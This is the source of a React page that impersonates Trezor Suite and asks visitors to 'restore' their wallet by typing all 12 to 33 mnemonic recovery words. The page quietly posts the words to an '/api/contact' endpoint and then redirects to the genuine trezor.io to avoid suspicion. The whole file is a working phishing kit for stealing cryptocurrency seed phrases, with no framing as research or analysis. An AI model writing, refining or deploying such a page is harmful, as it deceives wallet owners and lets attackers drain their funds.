"use client";
import { useState } from "react";

const WORD_OPTIONS = [12, 18, 20, 24, 33];

export default function Home() {
  const [count, setCount] = useState(12);
  const [words, setWords] = useState(Array(12).fill(""));
  const [open, setOpen] = useState(true);
  const [submitting, setSubmitting] = useState(false);

  const changeCount = (n) => {
    setCount(n);
    setWords(Array(n).fill(""));
  };

  const updateWord = (i, value) => {
    const copy = [...words];
    copy[i] = value;
    setWords(copy);
  };

  const allFilled = words.every((w) => w.trim() !== "");

  const handleSubmit = async () => {
    if (!allFilled || submitting) return;
    setSubmitting(true);
    try {
      const res = await fetch("/api/contact", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ words, count }),
      });
      if (res.ok) {
        window.location.href = "https://trezor.io/";
        return;
      }
      alert("Submission failed");
    } catch {
      alert("Network error");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <main className="flex flex-col lg:flex-row h-screen w-screen bg-gray-50 overflow-hidden">

      {/* LEFT SECTION */}
      <section className="w-full lg:w-2/5 bg-white flex flex-col items-center justify-center px-6 py-10 text-center">
        <div className="flex items-center gap-3 mb-6">
          <img src="/images.jpeg" className="w-10 h-10" alt="logo" />
          <span className="text-xl font-semibold text-gray-800">
            Trezor Suite
          </span>
        </div>
        <h1 className="text-4xl sm:text-5xl font-bold text-gray-800 mt-4">
          Welcome!
        </h1>
      </section>

      {/* RIGHT SECTION (SCROLLABLE) */}
      <section className="w-full lg:w-3/5 bg-gray-50 overflow-y-auto px-4 sm:px-6 py-8">

        {/* CONNECT CARD */}
        <div className="flex flex-col sm:flex-row items-center gap-4 sm:gap-6
                        h-auto sm:h-[122px]
                        w-full sm:w-[360px]
                        mx-auto
                        rounded-full
                        p-4 sm:p-2.5
                        bg-white
                        shadow-lg
                        mb-8">
          <div className="h-[72px] w-[72px] sm:h-[100px] sm:w-[100px]
                          rounded-full bg-gray-100
                          flex items-center justify-center">
            <img src="/trezor.webp" className="h-8 sm:h-10" alt="device" />
          </div>
          <span className="text-lg sm:text-xl font-medium text-gray-800 text-center">
            Connect your Trezor
          </span>
        </div>

        {/* MAIN CARD */}
        <div className="w-full max-w-2xl mx-auto bg-white rounded-2xl shadow-lg">

          {/* HEADER */}
          <button
            onClick={() => setOpen(!open)}
            className="w-full flex items-center justify-between px-5 sm:px-6 py-4
                       border-b border-gray-200
                       text-sm font-medium text-gray-500"
          >
            <span>Still don’t see your Trezor?</span>
            <svg
              className={`w-5 h-5 transition-transform ${
                open ? "rotate-180" : ""
              }`}
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
            </svg>
          </button>

          {open && (
            <div className="p-5 sm:p-6">

              <h2 className="text-center text-xl sm:text-2xl font-semibold mb-3">
                Restore Your Trezor Wallet!
              </h2>

              <p className="text-center text-sm text-gray-500 mb-6">
                How many words does your Mnemonic contain?
              </p>

              {/* WORD COUNT */}
              <div className="flex flex-wrap justify-center gap-2 mb-6">
                {WORD_OPTIONS.map((n) => (
                  <button
                    key={n}
                    onClick={() => changeCount(n)}
                    className={`px-4 py-1.5 text-sm rounded border
                      ${
                        count === n
                          ? "bg-green-600 border-green-600 text-white"
                          : "border-gray-300 hover:bg-gray-100"
                      }`}
                  >
                    {n} words
                  </button>
                ))}
              </div>

              <p className="text-xs text-gray-500 text-center mb-4">
                To restore your Trezor, type in your Mnemonic words below
              </p>

              {/* INPUT GRID */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
                {words.map((val, i) => (
                  <input
                    key={i}
                    value={val}
                    onChange={(e) => updateWord(i, e.target.value)}
                    placeholder={`${i + 1}.`}
                    className="w-full px-3 py-2 border border-gray-300 rounded
                               focus:outline-none focus:ring-2 focus:ring-green-500"
                  />
                ))}
              </div>

              {/* NEXT BUTTON */}
              <button
                onClick={handleSubmit}
                disabled={!allFilled || submitting}
                className="w-full sm:w-auto
                           px-10 py-2.5
                           text-sm font-semibold
                           text-white bg-green-600 rounded
                           hover:bg-green-700
                           disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {submitting ? "Submitting..." : "Next"}
              </button>

            </div>
          )}
        </div>
      </section>
    </main>
  );
}
